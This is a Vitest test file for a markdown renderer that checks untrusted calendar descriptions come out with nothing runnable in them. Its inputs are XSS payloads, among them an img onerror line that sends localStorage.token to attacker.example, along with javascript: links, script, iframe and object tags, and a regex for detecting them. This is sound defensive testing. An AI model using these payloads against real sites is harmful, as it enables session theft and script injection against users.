import { describe, expect, it, vi } from 'vitest';

// The real module reads `window.location`, which a node test has none of.
vi.mock('@/api-url', () => ({
    apiUrl: 'https://mory.invalid/api/',
    apiFilesUrl: 'https://mory.invalid/api/files/',
}));

import { renderMarkdown } from '@/markdown';

// What makes markup run: a script, a handler, a URL that is a script, or a document of its own.
const RUNNABLE = /<script|<iframe|<object|<embed|\son[a-z]+=|javascript:/i;

describe('renderMarkdown', () => {
    // A subscribed calendar's description is someone else's text, rendered inside mory where the
    // session token is in reach of anything that runs.
    it.each([
        '<img src="x" onerror="fetch(\'https://attacker.example/\' + localStorage.token)">',
        '<script>alert(1)</script>',
        '<a href="javascript:alert(1)">join</a>',
        '[join](javascript:alert(1))',
        '<svg><a href="javascript:alert(1)"><text>join</text></a></svg>',
        '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
        '<object data="javascript:alert(1)"></object>',
        '<form><button formaction="javascript:alert(1)">join</button></form>',
    ])('renders untrusted %s with nothing that runs', async (attack) => {
        const html = String(await renderMarkdown(attack, { untrusted: true }));
        expect(html).not.toMatch(RUNNABLE);
    });

    it('keeps the markup a feed formats its descriptions with', async () => {
        const html = String(await renderMarkdown(
            'Join <a href="https://meet.example/x">the call</a><br><b>Bring</b> the [agenda](https://example.com/a).',
            { untrusted: true },
        ));
        expect(html).toContain('<a href="https://meet.example/x">the call</a>');
        expect(html).toContain('<br>');
        expect(html).toContain('<b>Bring</b>');
        expect(html).toContain('<a href="https://example.com/a">agenda</a>');
    });

    it('leaves an untrusted mermaid diagram as the code it was written as', async () => {
        const html = String(await renderMarkdown('```mermaid\ngraph TD\n    A-->B\n```', { untrusted: true }));
        expect(html).toContain('language-mermaid');
        expect(html).not.toContain('<svg');
    });

    // The user's own raw HTML is a feature of their notes, and stays one.
    it('renders the raw HTML of a note as written', async () => {
        const html = String(await renderMarkdown('<span style="color: red">red</span>'));
        expect(html).toContain('<span style="color: red">red</span>');
    });
});
